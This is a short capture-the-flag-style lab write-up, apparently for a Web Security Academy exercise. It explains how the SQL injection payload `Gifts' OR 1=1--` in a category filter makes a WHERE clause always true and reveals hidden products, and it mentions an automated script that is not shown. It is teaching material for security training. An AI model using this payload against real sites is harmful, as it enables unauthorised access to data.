# SQL Injection Lab 01 - SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

## Manual Solution

### 1. Open the lab in Web Security Academy.
### 2. Add the following to the URL: `filter?category=Gifts`
- This URL triggers the following SQL query 
    ```sql 
    SELECT * FROM products WHERE category = 'Gifts'
    ```

### 2. Add the following to the URL: `filter?category=Gifts' OR 1=1--`
- This URL triggers the following SQL query: 
    ```sql 
    SELECT * FROM products WHERE category = 'Gifts' OR 1 = 1--'
    ```
    - The WHERE clause is always true because OR 1 = 1 is always true.
    - As a result, this URL displays all products regardless of their category.

### 3. You will see the SQL Injection successful message.

## Automated Solution

### 1. Download the script
### 2. Run the script with the following command: python sqli_lab_01.py -u <target_url> -p (if you want to use proxy 127.0.0.1:8080)

